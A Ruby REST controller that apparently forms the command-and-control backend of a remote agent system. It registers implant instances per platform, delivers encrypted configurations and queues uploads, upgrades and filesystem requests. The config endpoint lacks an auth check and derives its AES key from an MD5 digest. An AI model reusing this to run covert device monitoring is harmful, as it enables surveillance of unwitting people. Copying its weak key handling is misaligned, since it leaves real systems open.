#
# Controller for the Agent objects
#
require 'rcs-db/license'
require 'rcs-common/crypt'

module RCS
module DB

class AgentController < RESTController
  include RCS::Crypt
  
  def index
    require_auth_level :tech, :view
    
    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
    filter ||= {}
    
    mongoid_query do
      items = ::Item.agents.where(filter)
        .any_in(_id: @session[:accessible])
        .only(:name, :desc, :status, :_kind, :path, :stat)
      
      RESTController.reply.ok(items)
    end
  end
  
  def show
    require_auth_level :tech, :view
    
    mongoid_query do
      item = Item.agents
        .any_in(_id: @session[:accessible])
        .only(:name, :desc, :status, :_kind, :path, :stat, :ident, :upgradable, :group_ids, :counter)
        .find(@params['_id'])

      RESTController.reply.ok(item)
    end
  end
  
  def update
    require_auth_level :tech
    
    updatable_fields = ['name', 'desc', 'status']
    
    mongoid_query do
      item = Item.agents.any_in(_id: @session[:accessible]).find(@params['_id'])
      
      @params.delete_if {|k, v| not updatable_fields.include? k }
      
      @params.each_pair do |key, value|
        if item[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session[:user][:name],
                    :action => "#{item._kind}.update",
                    item._kind.to_sym => item['name'],
                    :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
        end
      end

      item.update_attributes(@params)
      
      return RESTController.reply.ok(item)
    end
  end

  def destroy
    require_auth_level :tech
    
    mongoid_query do
      item = Item.agents.any_in(_id: @session[:accessible]).find(@params['_id'])
      item.destroy
      
      Audit.log :actor => @session[:user][:name],
                :action => "#{item._kind}.delete",
                item._kind.to_sym => @params['name'],
                :desc => "Deleted #{item._kind} '#{item['name']}'"
      
      return RESTController.reply.ok
    end
  end
  
  # retrieve the factory key of the agents
  # if the parameter is specified, it take only that class
  # otherwise, return all the keys for all the classes
  def factory_keys
    require_auth_level :server
    
    classes = {}
    
    # request for a specific instance
    if @params['_id'] then
      Item.where({_kind: 'factory', ident: @params['_id']}).each do |entry|
          classes[entry[:ident]] = entry[:confkey]
      end
    # all of them
    else
      Item.where({_kind: 'factory'}).each do |entry|
          classes[entry[:ident]] = entry[:confkey]
        end
    end
    
    return RESTController.reply.ok(classes)
  end
  
  # retrieve the status of a agent instance.
  def status
    require_auth_level :server
    
    # parse the platform to check if the agent is in demo mode ( -DEMO appended )
    demo = @params['subtype'].end_with? '-DEMO'
    platform = @params['subtype'].gsub(/-DEMO/, '').downcase
    
    # retro compatibility for older agents (pre 8.0) sending win32, win64, ios, osx
    case platform
      when 'win32', 'win64'
        platform = 'windows'
      when 'winmobile'
        platform = 'winmo'
      when 'iphone'
        platform = 'ios'
      when 'macos'
        platform = 'osx'
    end
    
    # is the agent already in the database? (has it synchronized at least one time?)
    agent = Item.where({_kind: 'agent', ident: @params['ident'], instance: @params['instance'], platform: platform, demo: demo}).first

    # yes it is, return the status
    unless agent.nil?
      trace :info, "#{agent[:name]} is synchronizing (#{agent[:status]})"

      # if the agent was queued, but now we have a license, use it and set the status to open
      # a demo agent will never be queued
      if agent[:status] == 'queued' and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym) then
        agent.status = 'open'
        agent.save
      end

      status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
      return RESTController.reply.ok(status)
    end

    # search for the factory of that instance
    factory = Item.where({_kind: 'factory', ident: @params['ident'], status: 'open'}).first

    # the status of the factory must be open otherwise no instance can be cloned from it
    return RESTController.reply.not_found if factory.nil?

    # increment the instance counter for the factory
    factory[:counter] += 1
    factory.save

    trace :info, "Creating new instance for #{factory[:ident]} (#{factory[:counter]})"

    # clone the new instance from the factory
    agent = factory.clone_instance

    # specialize it with the platform and the unique instance
    agent.platform = platform
    agent.instance = @params['instance']
    agent.demo = demo

    # default is queued
    agent.status = 'queued'

    #TODO: add the upload files for the first sync

    # demo agent don't consume any license
    agent.status = 'open' if demo

    # check the license to see if we have room for another agent
    if demo == false and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym) then
      agent.status = 'open'
    end

    # save the new instance in the db
    agent.save

    status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
    return RESTController.reply.ok(status)
  end


  def config
    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first

    case @request[:method]
      when 'GET'
        config = agent.configs.where(:activated.exists => false).last
        return RESTController.reply.not_found if config.nil?

        # we have sent the configuration, wait for activation
        config.sent = Time.now.getutc.to_i
        config.save

        # encrypt the config for the agent using the confkey
        enc_config = aes_encrypt(config[:config], Digest::MD5.digest(agent[:confkey]))
        
        return RESTController.reply.ok(enc_config, {content_type: 'binary/octet-stream'})
        
      when 'DELETE'
        config = agent.configs.where(:activated.exists => false).last
        config.activated = Time.now.getutc.to_i
        config.save
        trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
    end
    
    return RESTController.reply.ok
  end


  # retrieve the list of upload for a given agent
  def uploads
    require_auth_level :server, :tech

    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    list = agent.upload_requests

    return RESTController.reply.ok(list)
  end

  # retrieve or delete a single upload entity
  def upload
    require_auth_level :server, :tech

    case @request[:method]
      when 'GET'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        upl = agent.upload_requests.where({ _id: @params['upload']}).first
        content = GridFS.instance.get upl[:_grid].first
        trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
        return RESTController.reply.ok(content.read, {content_type: content.content_type})
      when 'DELETE'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        agent.upload_requests.destroy_all(conditions: { _id: @params['upload']})
        trace :info, "[#{@request[:peer]}] Deleted the UPLOAD #{@params['upload']}"
    end
    
    return RESTController.reply.ok
  end
  
  # retrieve the list of upgrade for a given agent
  def upgrades
    require_auth_level :server, :tech
    
    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    list = agent.upgrade_requests

    return RESTController.reply.ok(list)
  end
  
  # retrieve or delete a single upgrade entity
  def upgrade
    require_auth_level :server, :tech

    case @request[:method]
      when 'GET'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        upl = agent.upgrade_requests.where({ _id: @params['upgrade']}).first
        content = GridFS.instance.get upl[:_grid].first
        trace :info, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
        return RESTController.reply.ok(content.read, {content_type: content.content_type})
      when 'DELETE'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        agent.upgrade_requests.destroy_all
        trace :info, "[#{@request[:peer]}] Deleted the UPGRADE #{@params['upgrade']}"
    end
    
    return RESTController.reply.ok
  end

  # retrieve the list of download for a given agent
  def downloads
    require_auth_level :server, :tech

    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    list = agent.download_requests

    return RESTController.reply.ok(list)
  end

  def download
    require_auth_level :server, :tech

    case @request[:method]
      when 'DELETE'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        agent.download_requests.destroy_all(conditions: { _id: @params['download']})
        trace :info, "[#{@request[:peer]}] Deleted the DOWNLOAD #{@params['download']}"
    end

    return RESTController.reply.ok
  end

  # retrieve the list of filesystem for a given agent
  def filesystems
    require_auth_level :server, :tech
    
    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    list = agent.filesystem_requests

    return RESTController.reply.ok(list)
  end
  
  def filesystem
    require_auth_level :server, :tech

    case @request[:method]
      when 'DELETE'
        agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
        agent.filesystem_requests.destroy_all(conditions: { _id: @params['filesystem']})
        trace :info, "[#{@request[:peer]}] Deleted the FILESYSTEM #{@params['filesystem']}"
    end
    
    return RESTController.reply.ok
  end

end

end #DB::
end #RCS::
